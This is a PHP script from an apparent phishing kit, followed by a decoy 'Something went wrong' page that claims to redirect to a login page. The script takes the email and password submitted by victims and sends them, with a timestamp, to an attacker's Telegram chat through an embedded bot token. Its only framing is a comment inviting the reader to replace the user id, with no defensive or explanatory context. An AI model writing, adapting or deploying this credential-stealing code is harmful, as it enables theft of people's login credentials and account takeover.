<?php

date_default_timezone_set("Europe/Spain");
error_reporting(0);

$time = date("h:i a", time());

$email = $_GET["email"];
$password = $_GET["password"];

$message = "Username : $email \nPassword: $password \nTried Login at $time IST";

$chat_id= 6454250313; // replace with your userid


send_message($chat_id,"$message");

function send_message($chat_id, $message){
    $text = urlencode($message);
    $apiToken = "6549796963:AAG4-5BNqiw_4Gqj_ICRs8wXBe7mnRXYX3";
    
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text";
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}


?>
<!DOCTYPE html>
<html>
<head>
	<title>Something Went Wrong</title>
</head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style type="text/css">
	body {
		margin: 10px;
	}
</style>
<body>
<p>Something went wrong. <br>
Try to login </p>

&nbsp;
<br>
Redirecting to Login Page...........
<br>
<a href="https://www.instagram.com/reboot13.dev/">Click here if you are not redirected automatically.</a>
</body>
</html>
